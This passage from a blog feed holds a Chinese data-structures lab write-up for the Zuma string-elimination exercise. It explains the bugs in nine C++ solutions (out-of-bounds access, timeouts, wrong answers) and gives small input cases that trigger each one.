$4B\times 66\times 9 \times 10^5 + 1B \times 9 \times 10^5 = 238500KB = 233.9MB &lt; 256MB$.</p><p>恰好满足题意.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zuma</title>
      <link href="/2022/10/19/shu-ju-jie-gou-zuma/"/>
      <url>/2022/10/19/shu-ju-jie-gou-zuma/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB1"><a href="#CST-LAB1" class="headerlink" title="CST LAB1"></a>CST LAB1</h1><h2 id="Zuma"><a href="#Zuma" class="headerlink" title="Zuma"></a>Zuma</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码 1"></a>代码 1</h3><ul><li><p>错误类型: <code>Runtime Error</code>  </p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> rank<span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> rank<span class="token punctuation">;</span>    <span class="token keyword">char</span> color <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">--</span>left<span class="token punctuation">;</span>    left <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> right <span class="token operator">-</span> left<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 <code>play</code> 函数并未显式调用 <code>return</code>, 在这里 <code>left</code> 的范围为 <code>[0, rank]</code>.</p><p>因此, 若 <code>left</code> 在函数体内变为 <code>0</code>, 那么在尾部调用 <code>play(left - 1)</code> 时便会访问到越界的内存 <code>a.at(-1)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>AAB</code> 经第一次消除后变为 <code>B</code>, 因为消除发生在串的最前部, 此时 <code>play</code> 函数内 <code>left = 0</code>, 接下来调用 <code>play(left - 1)</code> 时便会访问到越界的内存 <code>a.at(-1)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">AAB<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码 2"></a>代码 2</h3><ul><li><p>错误类型: <code>Runtime Error</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> next <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> next <span class="token operator">=</span> left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处 <code>play</code> 函数处理了 <code>left = 0</code> 的情况. 但如果经过消除, 在函数尾部串 <code>a</code> 为空, 此时 <code>left = 0</code>, 发生调用 <code>play(0)</code> 便会越界访问了空串 <code>a</code> 的元素 <code>a.at(0)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>AA</code> 经第一次消除后变为空串, 因为消除发生在串的最前部, 此时 <code>play</code> 函数内 <code>next = left = 0</code>, 接下来调用 <code>play(next)</code> 时便会访问到越界的内存 <code>a.at(0)</code>, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">AA<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码 3"></a>代码 3</h3><ul><li><p>错误类型: <code>Time Limit Exceeded</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">play</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这份代码在逻辑上是正确的, 但是由于采用数组实现, 时间复杂度正比于输入数据的规模. 因为数组的插入与删除操作复杂度为 $O(n)$, 那么当输入规模过大时, 会导致 <code>Time Limit Exceeded</code>.</p><ul><li>测例构造思路</li></ul><p>构造长度为 <code>500000</code> 的串 <code>a</code>, 并在串 <code>a</code> 的头部进行 <code>500000</code> 次插入操作, 导致超时.</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码 4"></a>代码 4</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">--</span>left<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> right <span class="token operator">-</span> left<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> left <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">play</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数的实现事实上并未能访问 <code>a.at(0)</code> 的具体元素, 注意到 <code>left</code> 可被赋值为 <code>0</code>, 此时在 <code>erase</code> 操作中会删去 <code>a.at(0)</code> 位置的元素, 如果在此时进行了消除则会导致 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>BAC</code> 经第一次插入 <code>A</code> 后 <code>left = 0</code>, <code>right = 3</code>, 错误地在串头部发生消除, 串 <code>a</code> 变为 <code>C</code>, 产生 <code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">BAC<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码 5"></a>代码 5</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> m<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主函数在读取字符串 <code>a</code> 时使用了 <code>cin</code>, 因为 <code>cin</code> 并不能读取空串, 因此这种方式不具有鲁棒性. 这种情况下, 程序会将本属于 <code>m</code> 的值读入 <code>a</code>, 进而导致错误.</p><ul><li>测例构造思路</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        cin <span class="token operator">&gt;&gt;</span> rank <span class="token operator">&gt;&gt;</span> color<span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> rank<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输入串 <code>a</code> 置空, 程序会将本属于 <code>m</code> 的值 <code>2</code> 读入 <code>a</code>, 将值 <code>0</code> 读入 <code>m</code>, 此时循环会因 <code>m = 0</code> 被直接跳过执行 <code>cout &lt;&lt; a &lt;&lt; endl</code>, 产生 <code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token number">2</span><span class="token number">0</span> A<span class="token number">0</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码 6"></a>代码 6</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Rank pos <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>cur <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">get</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> succ_len <span class="token operator">=</span> plen<span class="token punctuation">[</span>pos<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">-</span> pos<span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>succ_len <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">memmove</span><span class="token punctuation">(</span>cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> cur<span class="token punctuation">,</span> succ_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>cur <span class="token operator">=</span> ch<span class="token punctuation">;</span>    alen<span class="token operator">++</span><span class="token punctuation">;</span>    plen<span class="token punctuation">[</span>pos<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在插入字符的时候并未考虑是否会超出数组大小, 直接执行 <code>memmove</code> 操作. 由于字符串采用二维数组 <code>p[1 &lt;&lt; 12][plen_bound]</code> 形式存储, 占用了一块连续的内存. 若一直进行插入操作而不发生消除, 那么在单个数组到达最大容量后便会覆盖下个数组的内容, 进而导致输出串 <code>a</code> 时产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>只需向字符串头部不停执行插入操作而不产生消除即可, 在单个数组到达最大容量后便会覆盖下个数组的内容, 进而导致输出串 <code>a</code> 时产生 <code>Wrong Answer</code>.</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码 7"></a>代码 7</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 计算需要消除的开区间 (l, r)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>            l<span class="token punctuation">.</span>second<span class="token operator">--</span><span class="token punctuation">;</span>            dis<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>second <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                l<span class="token punctuation">.</span>first<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>                    l<span class="token punctuation">.</span>second <span class="token operator">+=</span> plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数中处理左右两侧 <code>Rank</code> 时, 会对左右侧 <code>Rank</code> 进行移动. 当需要消除的字符不全处于同一数组中时, 会进行判断并将 <code>Rank</code> 移动指向不同的数组.</p><p>但是在移动左侧 <code>Rank l</code> 时使用 <code>if</code> 进行判断, 每移动一个字符的位置, <code>l</code> 最多改变一个数组的指向. 因此若存在类似 <code>CBA| |ABC</code> 的情况 (使用 “|” 分隔不同的数组), 向第三组头部插入字符 <code>A</code>, 经过一个 <code>if</code> 循环后, <code>l</code> 仅能移动到第二组而非第一组.</p><p>此时 <code>l.first = 2</code>, <code>l.second = -1</code>, 由于存储字符串使用二维数组的结构, 操作 <code>get(l)</code> 会访问到 <code>p[1][plen_bound - 1] = p[1][4095]</code>, 而非预期中的 <code>p[1][plen[1] - 1] = p[1][2]</code>, 进而导致错误地认为不能消除, 产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>输入 <code>4099</code> 位的字符串 <code>a</code> 使得 <code>a</code> 能被存储入三个数组 <code>p[0]</code>、<code>p[1]</code>、<code>p[2]</code>, 然后通过一系列插入消除使得 <code>p[1]</code> 为空, 此时 <code>p[0]</code> 的末字符与 <code>p[2]</code> 的首字符均为 <code>B</code>. 最后向 <code>p[2]</code> 首部插入字符 <code>B</code>, 但是程序错误地认为不能消除, 产生 <code>Wrong Answer</code>.</p><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码 8"></a>代码 8</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        l<span class="token punctuation">.</span>second<span class="token operator">--</span><span class="token punctuation">;</span>        dis<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>second <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            l<span class="token punctuation">.</span>first<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>                l<span class="token punctuation">.</span>second <span class="token operator">+=</span> plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span>second<span class="token operator">++</span><span class="token punctuation">;</span>        dis<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>second <span class="token operator">&gt;=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">.</span>second <span class="token operator">-=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>            r<span class="token punctuation">.</span>first<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dis <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        eliminated <span class="token operator">+=</span> dis <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        lbound <span class="token operator">=</span> l<span class="token punctuation">;</span>        rbound <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在寻找相同字符这一部分缺失了其他代码所有的 <code>while(1)</code> 循环, 这导致在进行一次消除后无法进行同组内的连续消除, 进而产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>a</code> 为 <code>AABBA</code>, 向其中插入 <code>B</code> 后会先发生 <code>BBB</code> 的消除, 但无法进行 <code>AAA</code> 的连续消除, 输出 <code>AAA</code>, 产生<code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">AABBA<span class="token number">1</span><span class="token number">2</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码 9"></a>代码 9</h3><ul><li><p>错误类型: <code>Runtime Error</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>eliminated <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        alen <span class="token operator">-=</span> eliminated<span class="token punctuation">;</span>        l <span class="token operator">=</span> lbound<span class="token punctuation">;</span>        r <span class="token operator">=</span> rbound<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">.</span>second <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> len <span class="token operator">=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">-</span> r<span class="token punctuation">.</span>second<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>second<span class="token punctuation">]</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">=</span> len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">.</span>first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在执行消除过程中并未考虑特殊处理 <code>l.first = r.first</code> 的情形. 那么 <code>plen[l.first]</code> 被赋值为 <code>l.second + 1</code>, 接下来 <code>len = plen[r.first] - r.second = plen[l.first] - r.second</code> 为负值. 而 <code>plen[r.first]</code> 为 <code>size_t</code> 类型, 即 <code>unsigned long long</code> 类型, 从而在赋值 <code>plen[r.first] = len</code> 时会因下溢出而被赋为很大的正数.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">p2a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> copied <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pn<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token 